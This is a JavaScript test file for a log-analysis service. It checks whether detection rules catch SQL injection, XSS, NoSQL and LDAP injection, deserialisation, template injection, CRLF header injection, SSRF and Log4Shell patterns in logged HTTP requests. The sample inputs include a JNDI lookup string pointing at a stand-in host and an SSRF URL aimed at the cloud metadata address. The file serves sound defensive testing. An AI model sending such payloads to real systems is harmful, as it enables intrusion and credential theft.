const { describe, it } = require("node:test");
const assert = require("node:assert/strict");
const detectionRules = require("../data/detection_rules.json");
const { parseLogBatch } = require("../backend/services/logParserService");
const { countPatternMatches, analyzeLogs } = require("../backend/services/logAnalysisService");
const { EVENT_AWARE_RULES } = require("../backend/services/eventAwareRules");

const candidateIds = [
  "SQLI_005", "XSS_002", "XSS_004", "NOSQL_001", "LDAP_001",
  "DESER_001", "SSTI_001", "HDR_001", "SSRF_001", "LOG4_001", "JWT_001"
];
const ruleById = new Map(detectionRules.map((rule) => [rule.id, rule]));

function jsonLines(records) {
  return records.map((record) => JSON.stringify(record)).join("\n");
}

function bodyBatch(body) {
  return parseLogBatch(jsonLines([
    { message: "request under test", http: { body } },
    { message: "second valid JSON event" }
  ]));
}

describe("remaining HTTP body and special-rule characterization", () => {
  it("keeps the remaining non-SSRF candidates unregistered and confirms representative raw-body signatures", () => {
    const examples = {
      SQLI_005: "SELECT * FROM INFORMATION_SCHEMA.TABLES",
      XSS_002: '<img onerror="alert(1)">',
      XSS_004: "<svg viewBox=0>",
      NOSQL_001: '{"filter":"$ne: null"}',
      LDAP_001: "(&(cn=*)",
      DESER_001: 'O:8:"stdClass":1:{s:4:"name";s:3:"Bob";} ',
      SSTI_001: "Hello {{7*7}}",
      HDR_001: "prefix\r\nLocation: /target",
      SSRF_001: '{"url":"http://169.254.169.254/latest/meta-data"}',
      LOG4_001: "${jndi:ldap://example.test/a}",
      JWT_001: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature"
    };

    assert.deepEqual(Object.keys(examples), candidateIds);
    for (const id of candidateIds) {
      const rule = ruleById.get(id);
      assert.ok(rule, `missing current rule definition for ${id}`);
      if (id === "SSRF_001") {
        assert.deepEqual(EVENT_AWARE_RULES.find((entry) => entry.ruleId === id), {
          ruleId: "SSRF_001", fields: [["http", "body"], ["http", "url"], ["http", "query"]]
        });
      } else {
        assert.equal(EVENT_AWARE_RULES.some((entry) => entry.ruleId === id), false,
          `${id} must remain unregistered`);
      }
      const batch = bodyBatch(examples[id]);
      assert.equal(batch.events.length, 2);
      assert.equal(batch.events[0].http.body, examples[id]);
      assert.ok(countPatternMatches(batch.events[0].http.body, rule) > 0,
        `expected the current ${id} pattern to match its representative body text`);
    }
  });

  it("characterizes serialized JSON escape differences for XSS_002, DESER_001, and HDR_001", async () => {
    const cases = [
      ["XSS_002", '<img onerror="alert(1)">'],
      ["DESER_001", 'O:8:"stdClass":'],
      ["HDR_001", "prefix\r\nLocation: /target"]
    ];

    for (const [id, body] of cases) {
      const logs = jsonLines([
        { message: "request", http: { body } },
        { message: "second event" }
      ]);
      const parsed = parseLogBatch(logs);
      const raw = await analyzeLogs(logs);
      const rule = ruleById.get(id);

      assert.equal(parsed.events[0].http.body, body);
      assert.equal(countPatternMatches(parsed.events[0].http.body, rule), 1);
      assert.equal(raw.matchedRules.some((match) => match.id === id), false,
        `${id}: JSON escaping hides the signature from raw serialized-text matching in this sample`);
    }
  });

  it("characterizes NOSQL_001's quoted JSON-key limitation and query-string behavior", () => {
    const objectBody = '{"filter":{"$ne":null}}';
    const stringBody = '{"filter":"$ne: null"}';
    const objectBatch = bodyBatch(objectBody);
    const stringBatch = bodyBatch(stringBody);
    const queryBatch = parseLogBatch(jsonLines([
      { message: "query input", http: { query: "filter=$ne: null" } },
      { message: "second event" }
    ]));
    const rule = ruleById.get("NOSQL_001");

    assert.equal(countPatternMatches(objectBatch.events[0].http.body, rule), 0);
    assert.equal(countPatternMatches(stringBatch.events[0].http.body, rule), 1);
    assert.equal(countPatternMatches(queryBatch.events[0].http.query, rule), 1);
    assert.equal(queryBatch.events[0].http.query, "filter=$ne: null");
  });

  it("distinguishes SSRF-like URLs in body, URL, query, and path fields", () => {
    const target = "http://169.254.169.254/latest/meta-data";
    const batch = parseLogBatch(jsonLines([
      { message: "body URL", http: { body: JSON.stringify({ url: target }) } },
      { message: "full request URL", http: { url: `https://app.test/proxy?target=${target}` } },
      { message: "query URL", http: { query: `target=${target}` } },
      { message: "path only", http: { path: "/proxy/metadata" } },
      { message: "second JSON event" }
    ]));
    const rule = ruleById.get("SSRF_001");

    assert.equal(countPatternMatches(batch.events[0].http.body, rule), 1);
    assert.equal(countPatternMatches(batch.events[1].http.url, rule), 1);
    assert.equal(countPatternMatches(batch.events[1].http.query, rule), 1);
    assert.equal(countPatternMatches(batch.events[2].http.query, rule), 1);
    assert.equal(countPatternMatches(batch.events[3].http.path, rule), 0);
  });

  it("characterizes the selected-header shape and omitted arbitrary request headers", () => {
    const jndi = "${jndi:ldap://example.test/a}";
    const batch = parseLogBatch(jsonLines([
      {
        message: "request headers",
        http: {
          headers: {
            Host: jndi,
            "Content-Type": "application/json",
            "X-Forwarded-For": jndi,
            Referer: jndi,
            "X-Custom-Trace": jndi
          }
        }
      },
      { message: "second event" }
    ]));
    const headers = batch.events[0].http.headers;

    assert.deepEqual(Object.keys(headers), ["host", "content-type", "x-forwarded-for"]);
    assert.ok(Array.isArray(headers.host));
    assert.ok(Array.isArray(headers["x-forwarded-for"]));
    assert.equal(headers.host[0], jndi);
    assert.equal(headers["x-forwarded-for"][0], jndi);
    assert.equal(Object.hasOwn(headers, "referer"), false);
    assert.equal(Object.hasOwn(headers, "x-custom-trace"), false);
    assert.equal(EVENT_AWARE_RULES.some((entry) => entry.ruleId === "LOG4_001"), false);
  });

  it("characterizes JWT-shaped strings in body and query without retaining Authorization headers", () => {
    const token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature";
    const batch = parseLogBatch(jsonLines([
      { message: "body token", http: { body: JSON.stringify({ access_token: token }) } },
      { message: "query token", http: { query: `token=${token}` } },
      { message: "second event" }
    ]));
    const rule = ruleById.get("JWT_001");

    assert.equal(countPatternMatches(batch.events[0].http.body, rule), 1);
    assert.equal(countPatternMatches(batch.events[1].http.query, rule), 1);
    assert.equal(Object.hasOwn(batch.events[0].http.headers || {}, "authorization"), false);
  });
});
